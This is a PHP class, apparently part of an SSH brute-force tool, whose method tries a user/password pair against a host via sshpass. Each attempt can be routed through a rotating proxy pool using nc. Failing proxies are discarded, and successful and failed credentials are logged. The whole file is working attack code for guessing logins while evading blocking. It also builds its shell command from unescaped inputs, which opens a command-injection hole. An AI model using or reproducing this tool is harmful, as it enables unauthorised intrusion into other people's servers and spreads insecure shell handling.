<?php

namespace App\Services;

use App\Exception\BadProxyException;
use App\Services\Proxy\ProxyProviderInterface;
use Psr\Log\LoggerInterface;
use Symfony\Component\Process\Process;

class Brut
{
    private const WAIT_TIMEOUT = 10; // seconds

    private $proxyProvider;

    private $logger;

    /**
     * Brut constructor.
     *
     * @param ProxyProviderInterface $proxyProvider
     * @param LoggerInterface        $logger
     */
    public function __construct(ProxyProviderInterface $proxyProvider, LoggerInterface $logger)
    {
        $this->proxyProvider = $proxyProvider;
        $this->logger        = $logger;
    }

    /**
     * @see {https://linux.die.net/man/1/sshpass}
     *
     * @param string $user
     * @param string $pass
     * @param string $host
     * @param bool   $useProxy
     * @param string $port
     *
     * @throws BadProxyException
     *
     * @return bool
     */
    public function connect(string $user, string $pass, string $host, bool $useProxy, string $port = '22'): bool
    {
        $command = "/usr/bin/sshpass -p {$pass} ssh {$user}@{$host} -p{$port}";
        $proxy   = $this->proxyProvider->getProxy();

        if ($useProxy) {
            $command .= " -o \"ProxyCommand=nc -X connect -x {$proxy} %h %p\"";
        }

        $command .= " 'echo \$USER'"; // try to ask logged user username

        $process = new Process($command);
        $process->setTimeout(self::WAIT_TIMEOUT);
        $process->start();

        foreach ($process as $type => $data) {
            if (false !== \mb_strpos($data, 'ssh_')) {
                $this->proxyProvider->badProxy($proxy);

                throw new BadProxyException($data);
            }

            if (false !== \mb_strpos($data, 'Proxy error')) {
                $this->proxyProvider->badProxy($proxy);

                throw new BadProxyException($data);
            }

            if ($process::OUT !== $type) {
                continue;
            }

            if ($user !== \trim($data)) {
                continue;
            }

            $process->stop();

            $this->logger->info("Logged successfully to user: {$user}, with password: {$pass}");

            return true;
        }

        $process->stop();

        $this->logger->warning("Login forbidden to user: {$user}, with password: {$pass}");

        return false;
    }
}
